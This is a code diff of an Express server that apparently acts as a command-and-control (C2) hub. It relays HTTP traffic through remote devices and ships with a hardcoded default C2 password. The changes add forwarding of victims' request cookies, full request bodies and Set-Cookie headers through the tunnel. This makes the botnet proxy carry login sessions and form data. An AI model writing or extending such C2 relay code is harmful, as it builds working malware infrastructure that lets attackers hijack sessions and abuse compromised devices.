@@ -5,7 +5,7 @@ const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const C2_PASSWORD = process.env.C2_PASSWORD || 'admin1337';
+let currentC2Password = process.env.C2_PASSWORD || 'admin1337';
 
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
@@ -354,6 +354,7 @@ function handleTunnelResponse(req, res) {
         const buf = Buffer.from(data.payload || '', 'base64');
         pending.res.status(data.status || 200);
         if (data.contentType) pending.res.setHeader('Content-Type', data.contentType);
+        if (data.setCookie) pending.res.setHeader('Set-Cookie', data.setCookie);
         pending.res.send(buf);
     }
     res.json({ success: true });
@@ -688,12 +689,28 @@ app.all('*', (req, res) => {
 
     pendingResponses.set(requestId, { res });
 
+    let requestBody = '';
+    const contentType = req.headers['content-type'] || '';
+    if (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH') {
+        if (typeof req.body === 'string') {
+            requestBody = req.body;
+        } else if (req.body && typeof req.body === 'object') {
+            if (contentType.includes('application/json')) {
+                requestBody = JSON.stringify(req.body);
+            } else {
+                requestBody = new URLSearchParams(req.body).toString();
+            }
+        }
+    }
+
     const cmdObj = {
         type: 'request',
         id: requestId,
         method: req.method,
         path: relayPath,
-        body: req.method === 'POST' ? (typeof req.body === 'object' ? JSON.stringify(req.body) : req.body) : ''
+        cookie: req.headers.cookie || '',
+        body: requestBody,
+        contentType: contentType || 'application/x-www-form-urlencoded'
     };
 
     dispatchCommand(deviceId, cmdObj);
